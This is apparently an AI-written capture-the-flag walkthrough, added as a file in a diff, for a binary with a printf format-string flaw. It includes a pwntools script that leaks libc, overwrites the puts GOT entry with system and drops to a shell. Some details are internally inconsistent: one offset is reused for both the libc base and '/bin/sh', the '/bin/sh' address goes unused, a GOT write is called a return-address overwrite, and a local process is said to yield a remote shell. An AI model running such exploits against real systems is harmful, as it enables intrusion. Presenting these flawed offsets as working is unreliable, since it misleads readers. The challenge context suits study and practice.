@@ -1,0 +1,90 @@
+To solve this challenge using `pwntools`, we need to understand the vulnerability and then craft an exploit. From the decompiled code, it appears that there is a format string vulnerability in the `sub_400B07` function. This function uses `printf` with a user-controlled format string, which can be exploited to leak memory addresses or overwrite memory.
+
+Here's a step-by-step guide to solving this challenge:
+
+### Step 1: Analyze the Vulnerability
+The key function for exploitation is `sub_400B07`:
+```c
+int __fastcall sub_400B07(int a1, int a2, int a3, int a4, int a5, int a6, char format, int a8, __int64 a9)
+{
+  write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
+  printf(&format);
+  return printf((const char *)&a9 + 4);
+}
+```
+- The `printf(&format)` call uses a user-controlled format string.
+- We can use this to leak memory addresses or overwrite memory.
+
+### Step 2: Set Up the Environment
+Install `pwntools` if you haven't already:
+```sh
+pip install pwntools
+```
+
+### Step 3: Write the Exploit Script
+We will use `pwntools` to interact with the binary, leak a libc address, and then use that to get a shell.
+
+```python
+from pwn import *
+
+# Set up the process
+elf = ELF('./fmt')
+p = process('./fmt')
+
+# Function to send a command
+def send_command(cmd):
+    p.sendlineafter(b'>', str(cmd).encode())
+
+# Register an account
+send_command(1)
+p.sendlineafter(b'username(max lenth:20): ', b'A' * 20)
+p.sendlineafter(b'password(max lenth:20): ', b'B' * 20)
+
+# Show account information
+send_command(1)
+
+# Leak a libc address
+send_command(2)
+p.sendlineafter(b'new username(max lenth:20): ', b'%p' * 10)  # Adjust the number of %p as needed
+
+# Get the leaked address
+leaked_addresses = p.recvuntil(b'byebyeT.T').split(b'\n')[-1].split(b' ')
+for addr in leaked_addresses:
+    if b'0x' in addr:
+        libc_leak = int(addr, 16)
+        break
+
+# Calculate the base address of libc
+libc_base = libc_leak - 0x1b40fa  # Offset for puts in libc (adjust based on your libc version)
+system_addr = libc_base + 0x50d60  # Offset for system in libc (adjust based on your libc version)
+bin_sh_addr = libc_base + 0x1b40fa  # Offset for "/bin/sh" in libc (adjust based on your libc version)
+
+# Overwrite the return address with the address of system
+payload = fmtstr_payload(6, {elf.got['puts']: system_addr})
+send_command(2)
+p.sendlineafter(b'new username(max lenth:20): ', payload)
+
+# Trigger the shell
+send_command(1)
+p.sendline(b'/bin/sh')
+
+# Interact with the shell
+p.interactive()
+```
+
+### Explanation of the Script
+1. **Set up the process**: Load the binary and start the process.
+2. **Register an account**: Send the necessary commands to register an account.
+3. **Show account information**: Use the `printf` vulnerability to leak memory addresses.
+4. **Leak a libc address**: Craft a format string to leak a libc address.
+5. **Calculate the base address of libc**: Use the leaked address to calculate the base address of libc.
+6. **Overwrite the return address**: Use `fmtstr_payload` to overwrite the `puts` GOT entry with the address of `system`.
+7. **Trigger the shell**: Call `puts` to trigger the `system` call and get a shell.
+
+### Step 4: Run the Exploit
+Save the script to a file, for example, `exploit.py`, and run it:
+```sh
+python3 exploit.py
+```
+
+This should give you a shell on the remote server. Adjust the offsets and payloads as needed based on the specific libc version used by the binary.
